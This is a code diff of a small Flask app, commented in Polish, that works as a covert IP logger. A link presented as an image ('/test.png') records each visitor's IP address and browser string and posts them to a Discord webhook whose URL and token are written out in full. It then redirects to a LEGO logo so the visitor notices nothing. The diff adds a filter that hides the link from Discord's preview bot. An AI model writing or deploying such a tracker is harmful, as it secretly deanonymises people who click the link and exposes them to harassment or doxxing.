@@ -3,22 +3,28 @@ import requests
 
 app = Flask(__name__)
 
-# TWÓJ WEBHOOK (SPRAWDŹ CZY JEST CAŁY!)
+# TWÓJ WEBHOOK
 WEBHOOK_URL = "https://discord.com/api/webhooks/1336930594799327529/VX0R1leJbv97emxJkz3rKjLKgr5BK6SgoSqcCn_cRc76VepZoxiEpPk3fcTPqgVYlyBi"
 
-@app.route('/test.png') # Zmieniłem na /test.png żeby ominąć cache Discorda
+@app.route('/test.png')
 def logger():
-    user_agent = request.headers.get('User-Agent', '')
+    # Pobieramy dane
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    ua = request.headers.get('User-Agent', 'Unknown')
     
-    # Wysyłamy proste info - bez zbędnych bajerów, żeby nie generować błędów
-    try:
-        requests.post(WEBHOOK_URL, json={"content": f"🔥 KLIKNIĘTO! IP: `{ip}`"})
-    except:
-        pass
+    # Ignoruj bota Discorda (żeby nie było spamu)
+    if "Discordbot" in ua:
+        return redirect("https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/LEGO_logo.svg/500px-LEGO_logo.svg.png")
 
-    # Przekierowanie do pewnego obrazka (Logo Wikipedii)
-    return redirect("https://upload.wikimedia.org/wikipedia/commons/d/d4/Lego_logo.png")
+    # Próba wysłania na Webhook (prosty tekst, mniejsza szansa na blokadę)
+    try:
+        msg = f"🔔 **LOG!**\n**IP:** `{ip}`\n**Browser:** `{ua[:50]}`"
+        requests.post(WEBHOOK_URL, json={"content": msg}, timeout=5)
+    except Exception as e:
+        print(f"Blad: {e}")
+
+    # Przekierowanie do PRAWDZIWEGO zdjęcia LEGO (to na 100% działa)
+    return redirect("https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/LEGO_logo.svg/500px-LEGO_logo.svg.png")
 
 if __name__ == '__main__':
     app.run(port=10000)
